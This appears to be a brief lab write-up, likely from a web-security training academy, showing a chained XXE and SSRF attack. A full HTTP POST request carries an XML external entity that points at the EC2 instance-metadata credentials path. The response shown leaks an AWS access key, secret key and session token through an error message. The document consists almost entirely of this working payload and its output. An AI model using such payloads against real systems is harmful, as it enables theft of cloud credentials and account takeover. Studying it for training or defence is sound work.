# Attacks

### Using XXE to exfiltrate secret key from EC2 instance: Chained XXE + SSRF

`Malicious POST request`

```bash
POST /product/stock HTTP/1.1
Host: ac671fb81fcc504080b042be005f0023.web-security-academy.net
Connection: close
Content-Length: 223
Sec-Fetch-Mode: cors
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://ac671fb81fcc504080b042be005f0023.web-security-academy.net
Sec-Fetch-Site: same-origin
Referer: https://ac671fb81fcc504080b042be005f0023.web-security-academy.net/product?productId=10
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=XXXXXXXXXXXXXXXXXXXX

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

`Response:`

```bash
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2019-08-22T16:39:15.242880Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "74kLixnlUZcsLknsyMq5",
  "SecretAccessKey" : "QRN6iUdJkj6CA5yt82cF0jfdh5DIgKx3RDQq5pBZ",
  "Token" : "kYcYbyXcZU7137kRXZj9mKrbWYvjXpd06s7renO6SYBYoTKBOSnQo3Tiq6GztUoOIl67AH37YZNZlvtxkvAVFygPPW54n49jNY2FvEGFVp6Jj6Pdgs6mBLcChJ6JX7CDbAe7g3YqDhYBt65PnJYVFuO7VSgNgrx8KYGWdf1l0GwGjfEuFjocZYEojx57XP8nGTW9srH1n0pZAk8GANWS62XUhZE4V1gmn7yvcnY3ORQWOHjJEb46KKNG1yPJgOY8",
  "Expiration" : "2025-08-20T16:39:15.242880Z"
}"
```
